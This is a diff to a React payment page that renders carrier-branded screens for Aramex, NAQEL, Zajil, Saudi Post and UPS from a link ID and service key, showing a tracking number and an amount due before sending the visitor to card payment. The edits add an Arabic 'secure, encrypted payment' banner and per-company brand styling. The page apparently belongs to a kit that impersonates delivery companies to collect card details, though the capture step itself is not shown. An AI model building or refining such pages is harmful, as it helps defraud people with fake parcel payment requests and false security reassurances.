@@ -1,13 +1,16 @@
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
+import { Card } from "@/components/ui/card";
+import { Badge } from "@/components/ui/badge";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, Shield, CheckCircle2, Lock } from "lucide-react";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -17,6 +20,7 @@ const PaymentDetails = () => {
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyBranding = getBrandingByCompany(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
   const getLayout = () => {
@@ -77,30 +81,70 @@ const PaymentDetails = () => {
   };
   
   const paymentContent = (
+      <>
+      {/* Security Notice */}
+      <div 
+        className="mb-6 p-4 rounded-xl flex items-center gap-3"
+        style={{
+          background: `${branding.colors.primary}08`,
+          border: `1.5px solid ${branding.colors.primary}30`,
+          borderRadius: companyBranding?.borderRadius?.md || '10px'
+        }}
+      >
+        <Shield className="w-6 h-6" style={{ color: branding.colors.primary }} />
+        <div>
+          <p className="text-sm font-bold" style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>
+            دفع آمن ومشفر
+          </p>
+          <p className="text-xs" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
+            معلوماتك محمية بأعلى معايير الأمان
+          </p>
+        </div>
+      </div>
+
       {/* Shipping Info Display */}
       {shippingInfo && (
-        <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
-          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
-          <div className="space-y-2 text-xs sm:text-sm">
+        <div 
+          className="mb-6 sm:mb-8 p-4 sm:p-5 rounded-xl"
+          style={{
+            background: companyBranding?.colors?.surface || '#F8F8F8',
+            borderRadius: companyBranding?.borderRadius?.md || '10px',
+            border: `1px solid ${companyBranding?.colors?.border || '#E5E5E5'}`
+          }}
+        >
+          <h3 
+            className="font-bold mb-3 sm:mb-4 text-base sm:text-lg flex items-center gap-2"
+            style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
+          >
+            <Package className="w-5 h-5" style={{ color: branding.colors.primary }} />
+            تفاصيل الشحنة
+          </h3>
+          <div className="space-y-3 text-sm sm:text-base">
             {shippingInfo.tracking_number && (
-              <div className="flex items-center gap-2">
-                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">رقم الشحنة:</span>
-                <span className="font-semibold">{shippingInfo.tracking_number}</span>
+              <div className="flex items-center justify-between p-3 rounded-lg" style={{ background: '#FFFFFF' }}>
+                <div className="flex items-center gap-2">
+                  <Hash className="w-5 h-5" style={{ color: branding.colors.primary }} />
+                  <span className="font-medium" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>رقم التتبع:</span>
+                </div>
+                <span className="font-bold font-mono" style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>{shippingInfo.tracking_number}</span>
               </div>
             )}
             {shippingInfo.package_description && (
-              <div className="flex items-center gap-2">
-                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">وصف الطرد:</span>
-                <span className="font-semibold">{shippingInfo.package_description}</span>
+              <div className="flex items-center justify-between p-3 rounded-lg" style={{ background: '#FFFFFF' }}>
+                <div className="flex items-center gap-2">
+                  <Truck className="w-5 h-5" style={{ color: branding.colors.primary }} />
+                  <span className="font-medium" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>وصف الشحنة:</span>
+                </div>
+                <span className="font-bold" style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>{shippingInfo.package_description}</span>
               </div>
             )}
             {shippingInfo.cod_amount > 0 && (
-              <div className="flex items-center gap-2">
-                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">مبلغ COD:</span>
-                <span className="font-semibold">{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
+              <div className="flex items-center justify-between p-3 rounded-lg" style={{ background: '#FFFFFF' }}>
+                <div className="flex items-center gap-2">
+                  <DollarSign className="w-5 h-5" style={{ color: branding.colors.primary }} />
+                  <span className="font-medium" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>مبلغ الدفع:</span>
+                </div>
+                <span className="font-bold text-lg" style={{ color: branding.colors.primary }}>{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
               </div>
             )}
           </div>
@@ -108,43 +152,74 @@ const PaymentDetails = () => {
       )}
       
       {/* Payment Summary */}
-      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
-          <span className="text-muted-foreground">الخدمة</span>
-          <span className="font-semibold">{serviceName}</span>
-        </div>
-        
+      <div className="space-y-4 sm:space-y-5 mb-8 sm:mb-10">
+        <h3 
+          className="font-bold text-lg sm:text-xl mb-4"
+          style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
+        >
+          ملخص الدفع
+        </h3>
+
         <div 
-          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
+          className="p-4 rounded-xl"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
+            background: companyBranding?.colors?.surface || '#F8F8F8',
+            border: `1px solid ${companyBranding?.colors?.border || '#E5E5E5'}`,
+            borderRadius: companyBranding?.borderRadius?.md || '10px'
           }}
         >
-          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
-          <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
-            {formattedAmount}
-          </span>
+          <div className="flex justify-between items-center py-3 border-b" style={{ borderColor: companyBranding?.colors?.border || '#E5E5E5' }}>
+            <span className="text-sm font-medium" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>الخدمة</span>
+            <span className="font-bold text-base" style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>{serviceName}</span>
+          </div>
+          
+          <div className="flex justify-between items-center py-4">
+            <span className="text-lg font-bold" style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>المبلغ الإجمالي</span>
+            <span 
+              className="text-2xl sm:text-3xl font-bold" 
+              style={{ 
+                color: branding.colors.primary,
+                fontFamily: companyBranding?.fonts?.primary || 'Arial, sans-serif'
+              }}
+            >
+              {formattedAmount}
+            </span>
+          </div>
         </div>
       </div>
     
       {/* Payment Method */}
-      <div className="mb-6 sm:mb-8">
-        <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
+      <div className="mb-8 sm:mb-10">
+        <h3 
+          className="font-bold mb-4 text-base sm:text-lg"
+          style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
+        >
+          طريقة الدفع
+        </h3>
         <div 
-          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4"
+          className="border-2 rounded-xl p-5 sm:p-6 transition-all hover:shadow-lg"
           style={{
             borderColor: branding.colors.primary,
-            background: `${branding.colors.primary}10`
+            background: `${branding.colors.primary}08`,
+            borderRadius: companyBranding?.borderRadius?.md || '10px'
           }}
         >
-          <div className="flex items-center gap-2 sm:gap-3">
-            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
-            <div>
-              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
-              <p className="text-xs sm:text-sm text-muted-foreground">
-                Visa، Mastercard، Mada
+          <div className="flex items-center gap-4">
+            <div
+              className="w-12 h-12 sm:w-14 sm:h-14 rounded-full flex items-center justify-center"
+              style={{ background: branding.colors.primary }}
+            >
+              <CreditCard className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
+            </div>
+            <div className="flex-1">
+              <p className="font-bold text-base sm:text-lg mb-1" style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>
+                الدفع بالبطاقة
+              </p>
+              <p className="text-sm" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
+                Visa • Mastercard • Mada
               </p>
             </div>
+            <CheckCircle2 className="w-6 h-6" style={{ color: branding.colors.primary }} />
           </div>
         </div>
       </div>
@@ -153,18 +228,23 @@ const PaymentDetails = () => {
       <Button
         onClick={handleProceed}
         size="lg"
-        className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+        className="w-full text-base sm:text-xl py-6 sm:py-8 text-white font-bold transition-all hover:opacity-90 hover:shadow-2xl"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+          background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+          borderRadius: companyBranding?.borderRadius?.md || '10px',
+          boxShadow: companyBranding?.shadows?.lg || '0 10px 25px rgba(0,0,0,0.15)',
+          fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
         }}
       >
-        <span className="ml-2">الدفع بالبطاقة</span>
-        <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+        <span className="ml-2">متابعة إلى الدفع</span>
+        <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 mr-2" />
       </Button>
     
-      <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-        بالمتابعة، أنت توافق على الشروط والأحكام
+      <p className="text-xs sm:text-sm text-center mt-4 sm:mt-5" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
+        <Lock className="w-3 h-3 inline ml-1" />
+        بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
       </p>
+      </>
   );
 
   return (
